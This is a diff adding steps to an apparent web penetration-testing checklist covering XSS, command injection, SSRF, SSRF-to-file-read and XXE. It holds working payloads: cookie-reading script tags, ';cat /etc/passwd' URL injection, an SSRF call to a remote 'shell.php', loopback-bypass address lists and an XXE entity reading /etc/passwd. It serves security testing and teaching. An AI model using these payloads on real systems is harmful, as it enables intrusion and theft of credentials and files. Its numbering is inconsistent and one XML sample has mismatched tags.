@@ -184,10 +184,72 @@ Accept-Ranges: bytes
 
 6.5. You can more automated tools such as `sqlninja`, `sqldumper` and `sql power injector`.
 
-6.6. Perform Union Query SQL injection testing.
+6.6. Perform Union Query SQL injection testing and Time delays.
+
+6.7. Analyze each input vector to detect potential XSS vulnerabilities.
+
+6.8. For XSS, try to identify any parameters that is reflected on the page so if output is reflected back inside the JavaScript as a value of any variable just check for reflected XSS, you can start insert basic XSS payload such as `'><script>alert(123);</script>` and check the HTTP response, try to check what tags are being filtered so you can try bypass this by using different payloads, try to do some basic encoding `%3cscript%3ealert(document.cookie)%3c/script%3e`.
+
+6.9. Upload a JavaScript using Image file.
+
+6.10. Unusual way to execute your JS payload is to change method from POST to GET, it bypasses filters sometimes
+
+6.11. Check for Stored XSS, if you found any input that is being saved on the server and its reflected on the page, try to add XSS payload and save it to the application, such as add a comment, if you found that the date i being saved to the application and its not reflected on the application, you can try Blind-XSS.
+
+6.12. Look for command injection, when viewing a file in a web application, the filename is often shown in the URL. Perl allows piping data from a process into an open statement, the user can simply append the Pipe symbol `|` onto the end of the filename, for example `http:/target.com/userData.pl?doc=/bin/ls|`. Also appending a semicolon to the end of a URL for a `.PHP` page followed by an operating system command, will execute the command. `http://target.com/something.php?dir=%3Bcat%20/etc/passwd`
+
+3.13. If you found a `POST` request contains parameters that retriving a file, simply you can inject a command injection for example `Doc=Doc1.pdf` > `Doc=Doc1.pdf+|+Dir c:\`.
+
+3.14. The following special character can be used for command injection such as `|` `;` `&` `$` `>` `<` `'` `!`.
+
+3.15. Look for SSRF, when testing for SSRF, you attempt to make the targeted server inadvertently load or save content that could be malicious, so if you found a parameter calling for a page file, for example `GET https://target.com/page?page=https://malicioussite.com/shell.php`, or you can access local restricted page `GET https://target.com/page?page=page=http://localhost/admin` or `https://target.com/page?page=page=http://127.0.0.1/admin`.
+
+```
+Another SSRF List:
+http://[::]:80/
+http://[::]:25/
+http://[::]:22/
+http://[::]:3128/
+http://0000::1:80/
+http://0000::1:25/
+http://0000::1:22/
+http://0000::1:3128/
+http://127.0.1.3
+http://127.0.0.0
+http://0177.0.0.1/
+http://2130706433/
+http://3232235521/
+http://3232235777/
+```
+
+3.16. Test any parameter that takes URL such as "img_url", "redirect", check first if the vulnerable parameter can communicate with external server.
+
+```
+SSRF to LFI:
+https://target.com/img.php?img_url=file:///etc/passwd
+file:///c:/boot.ini
+file://path/to/file
+file:///etc/passwd
+file://\/\/etc/passwd
+ssrf.php?url=file:///etc/passwd
+```
+
+3.17. If the application is sending any HTTP requests that contains `XML`, try to look for `XML/XXE injection`  
+```
+No instead of sending a text, we can try external ENTITY (file:///c:/boot.ini) for Windows OS :
+<?xml version="1.0" encoding="UTF-8"?>
+ <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root>
+  <name>mo</name>
+  <email>&xxe;</name>
+</root>
+```
+
+
 
 
 ## 7. Business Logic Testing
+
 
 ## 8. Error Handling
 
